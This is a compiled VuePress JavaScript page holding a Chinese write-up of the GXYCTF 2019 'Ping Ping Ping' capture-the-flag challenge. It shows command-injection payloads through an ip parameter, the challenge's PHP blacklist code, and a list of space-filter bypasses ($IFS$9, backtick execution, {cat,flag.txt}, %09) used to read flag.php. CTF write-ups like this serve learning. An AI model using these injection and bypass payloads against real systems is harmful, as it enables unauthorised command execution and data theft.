import{_ as a,r as t,o as e,c as p,a as n,b as o,d as c,e as l}from"./app-91d1060a.js";const i="/CTF-problems/assets/Pasted image 20230507102601-ed4426b5.png",u={},r=l('<p>#RCE</p><p><img src="'+i+`" alt="Pasted image 20230507102601.png"> 框中输入东西后发现是链接中多了 /?ip=</p><p>尝试</p><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">ip</span>=<span class="token value">127.0.0.1</span></span><span class="token pair-delimiter">;</span><span class="token pair"><span class="token key">ls</span></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发现有<code>flag.php</code>和<code>index.php</code></p><p>过滤了空格，先查看一下 <code>index.php</code></p><div class="language-url line-numbers-mode" data-ext="url"><pre class="language-url"><code><span class="token path"><span class="token path-separator">/</span></span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">ip</span>=<span class="token value">127.0.0.1</span></span><span class="token pair-delimiter">;</span><span class="token pair"><span class="token key">tac$IFS$9index.php</span></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发现过滤</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;ping -c 4 &quot;</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;fxck your flag!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/.*f.*l.*a.*g.*/&quot;</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;fxck your bash!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/bash/&quot;</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;fxck your space!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/ /&quot;</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token punctuation">}</span>
			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;fxck your symbol!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{1f}]|\\&gt;|\\&#39;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用内联执行查看<code>flag.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/?ip=127.0.0.1;tac$IFS$9\`ls\`
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h5 id="绕过空格" tabindex="-1"><a class="header-anchor" href="#绕过空格" aria-hidden="true">#</a> 绕过空格</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token punctuation">{</span>cat,flag.txt<span class="token punctuation">}</span>
<span class="token function">cat</span><span class="token variable">\${<span class="token environment constant">IFS</span>}</span>flag.txt
<span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9flag</span>.txt
<span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$1flag</span>.txt
cat<span class="token operator">&lt;</span>flag.txt
%09替换
cat<span class="token operator">&lt;&gt;</span>flag.txt
<span class="token assign-left variable">kg</span><span class="token operator">=</span><span class="token string">$&#39;<span class="token entity" title="\\x20">\\x20</span>flag.txt&#39;</span><span class="token operator">&amp;&amp;</span><span class="token function">cat</span><span class="token variable">$kg</span>
<span class="token punctuation">(</span><span class="token punctuation">\\</span>x20转换成字符串就是空格，这里通过变量的方式巧妙绕过<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13),d={href:"https://blog.csdn.net/m0_62422842/article/details/124616206",target:"_blank",rel:"noopener noreferrer"};function k(v,g){const s=t("ExternalLinkIcon");return e(),p("div",null,[r,n("p",null,[n("a",d,[o("[GXYCTF 2019]Ping Ping Ping_XiLitter 的博客-CSDN 博客"),c(s)])])])}const b=a(u,[["render",k],["__file","Ping Ping Ping.html.vue"]]);export{b as default};
